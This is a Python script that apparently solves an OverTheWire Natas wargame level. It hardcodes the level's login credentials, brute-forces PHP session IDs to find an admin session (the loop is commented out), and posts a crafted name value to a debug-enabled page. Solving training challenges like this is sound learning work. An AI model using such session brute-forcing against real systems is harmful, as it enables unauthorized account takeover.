import os
import urllib.request as url
import urllib.parse
import string
import time

NATAS_URL = 'http://natas20.natas.labs.overthewire.org/index.php?debug=true'
NATAS_USERNAME = 'natas20'
NATAS_PWD = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
PASSWORD_LENGTH = 33


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password(
        'Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    # This commented out tactic also works. The website accepts the Authorization header
    # after having connected at least once

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


def isCorrectInput(string):
    '''
    Determines if the string is the correct id or not

        Parameters:
            string : The id

        Returns:
            True if the id is correct. False otherwise
    '''
    request = urllib.parse.urlencode(
        {'username': 'admin', 'password': 'admin'})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)
    post_request.add_header('Cookie', f'PHPSESSID={string}')

    output = url.urlopen(post_request)

    html_page = output.read().decode()

    return True if html_page.find('You are an admin.') != -1 else False

def output(string):
    request = urllib.parse.urlencode(
        {'name': string})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)
    post_request.add_header('Cookie', f'PHPSESSID=oh4e8udrcubng3n6u9g48dqbh6')

    output = url.urlopen(post_request)

    html_page = output.read().decode()

    return html_page


if __name__ == "__main__":

    initialPageConnexion()

    # =======================================================================================
    # This part creates a list of letters that are in the password. I commented it out
    # because it takes some time to run so I want to avoid running it too often
    # =======================================================================================

    # hexValues = ['0', '1', '2', '3', '4', '5', '6',
    #              '7', '8', '9']

    # for id1 in hexValues:
    #     for id2 in hexValues:
    #         for id3 in hexValues:
    #             id = str(id1) + str(id2) + str(id3)
    #             adjustedId = '3' + id[0] + '3' + id[1] + '3' + id[2] + '2d61646d696e'
    #             print(f'Trying id = {adjustedId}...')
    #             if isCorrectInput(adjustedId):
    #                 print(f'Admin sesion id: {id}')
    #                 exit()
    print(output('admin'))


# admin     :   d6ruj8utn4m5o078lgqngqn525
# admin     :   reoc4tg958udt016jm4g1cib07